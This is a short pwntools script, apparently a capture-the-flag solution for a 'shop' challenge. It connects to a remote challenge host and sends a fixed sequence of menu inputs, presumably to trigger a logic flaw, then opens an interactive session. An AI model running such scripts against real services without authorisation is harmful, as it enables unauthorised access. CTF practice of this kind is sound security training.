from pwn import *

context.log_level = 'debug'
#io = process('./shop')
io = remote('ephemerally.top',28055)

def choice(io,i):
    io.recvuntil(b'>')
    io.sendline(i)

def which(io,i):
    io.recvuntil(b'\n>')
    io.sendline(i)

#choice(io,b'3')
#which(io,b'0')
#choice(io,b'3')
#which(io,b'0')
#choice(io,b'2')
#which(io,b'1')
#choice(io,b'1')
io.sendline(b'3')
io.sendline(b'0')
io.sendline(b'3')
io.sendline(b'0')


io.interactive()
